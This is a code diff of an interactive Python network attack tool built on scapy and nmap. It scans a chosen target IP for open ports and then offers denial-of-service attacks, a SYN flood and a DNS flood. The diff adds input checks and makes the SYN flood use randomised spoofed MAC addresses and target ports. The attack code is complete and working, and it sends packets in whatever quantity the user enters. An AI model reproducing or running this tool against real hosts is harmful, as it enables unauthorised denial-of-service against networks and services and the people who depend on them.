@@ -1,6 +1,7 @@
 from scapy.all import *
 import nmap
 import re
+import sys
 
 values = {}
 
@@ -11,10 +12,13 @@ if len(interfaces) > 1:
             print("\n", i, '. ' + item, sep='',end='')
         try:
             data = int(input("\n\nWhich Interface? (Enter a Number): "))
-            interface_name = interfaces[data]
-            break
+            if 1 <= data <= (len(interfaces)+1):
+                interface_name = interfaces[data]
+                break
+            else:
+                print("\nInvalid input\n", data)
         except:
-            print("\nInvalid input", data)
+            print("\nInvalid input\n", data)
 else:
     interface_name = conf.iface
 
@@ -30,33 +34,46 @@ values["source_mac_address"]=source_mac_address
 og_source_mac_address = source_mac_address
 
 # Get Target IP Address
-while True:
-    target_ip = input("Enter target IP address: ")
-    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-    if(re.search(regex, target_ip.lower())):
-        values["target_ip"]=target_ip
+correct = "no"
+while correct != "yes":
+    while True:
+        target_ip = input("\n\nEnter target IP address: ")
+        regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+        if(re.search(regex, target_ip.lower())):
+            values["target_ip"]=target_ip
+            break
+        else:
+            print("\nInvalid IP address\n")
+
+    # Get Target MAC Address
+    nm = nmap.PortScanner()
+    print("\n\nGetting target's information. Please wait...")
+    nm.scan(arguments='F', hosts=target_ip)
+    target_mac_address = str(nm[target_ip]['addresses']['mac']).lower()
+    values["target_mac_address"]=target_mac_address
+
+    # Get Target Ports
+    try:
+        ports = list(nm[target_ip]['tcp'].keys())
+        values["ports"]=ports
+        print(ports)
+    except:
+        ports = []
+        values["ports"]=ports
+        print("\nNo ports available on this target\n")
+
+    while True:
+        correct = input("\n\nAttack this host? (yes/no): ")
+        if correct == "yes":
+            break
+        elif correct == "no":
+            break
+        else:
+            print("\nDid not understand, please try again\n")
+
+    if correct == "yes":
         break
-    else:
-        print("Invalid IP address\n")
-
-# Get Target MAC Address
-nm = nmap.PortScanner()
-print("Getting target's information. Please wait...")
-nm.scan(target_ip, '0-1023')
-target_mac_address = str(nm[target_ip]['addresses']['mac']).lower()
-values["target_mac_address"]=target_mac_address
-
-# For troubleshooting in case get target ports errors out
-print("Ports open")
-for port in nm[target_ip].all_tcp():
-	state = nm[target_ip]['tcp'][port]['state']
-	if state == 'open':
-		print(nm[target_ip]['tcp'][port])
-
-# Get Target Ports
-tcp_ports = list(nm[target_ip]['tcp'].keys())
-values["tcp_ports"]=tcp_ports
-conf.route.add(host=target_ip)
+        
 
 # To test comment out everything above (including the import block) and uncomment the block below
 '''
@@ -66,8 +83,8 @@ import sys
 import random
 
 values = {}
-tcp_ports = [80, 22, 53]
-values["tcp_ports"]=tcp_ports
+ports = [80, 22, 53]
+values["ports"]=ports
 target_mac_address = "00:0c:29:ac:a4:4a"
 values["target_mac_address"]=target_mac_address
 og_source_mac_address = "ff:ff:ff:ff:ff:ff"
@@ -90,13 +107,12 @@ def syn_flood():
     variable_input(valid_var, help_statement)
     all_variables_inputted(valid_var)
     check_var(values, valid_var)
-    template = (IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
-    #template = (Ether(src=values.get("source_mac_address"), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
+    template = (Ether(src=RandMAC(), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
     ns = []
     pktAmt = int(values.get("quantity"))
     for pktNum in range(0,pktAmt):
     	ns.extend(template)
-    	ns[pktNum][TCP].dport = random.choice(tcp_ports)
+    	ns[pktNum][TCP].dport = random.choice(ports)
     print(ns)
     send(ns)
     print("Packets sent")
@@ -283,10 +299,10 @@ def reset():
 
 available_templates = {"Attack Name/Explaination":"attack_function_name"}
     
-if len(tcp_ports) != 0:
+if len(ports) != 0:
     available_templates["SYN Flood"]=syn_flood
     
-if 53 in tcp_ports:
+if 53 in ports:
     available_templates["DNS DOS"]=bind_dos
 
 
@@ -295,11 +311,14 @@ while True:
         print("\n", i, '. ' + item, sep='',end='')
     try:
         data = int(input("\n\nWhich Attack? (Enter a Number): "))
-        available_templates.get(list(available_templates.keys())[data])()
-        reset()
-        #break
+        if 1 <= data <= (len(list(available_templates.keys())) -1):
+            available_templates.get(list(available_templates.keys())[data])()
+            reset()
+            #break
+        else:
+            print("\nInvalid input", data)
     except KeyboardInterrupt:
         print("\nExiting program")
         sys.exit()
-    #except:
-        #print("\nInvalid input", data)
+    except:
+        print("\nInvalid input")
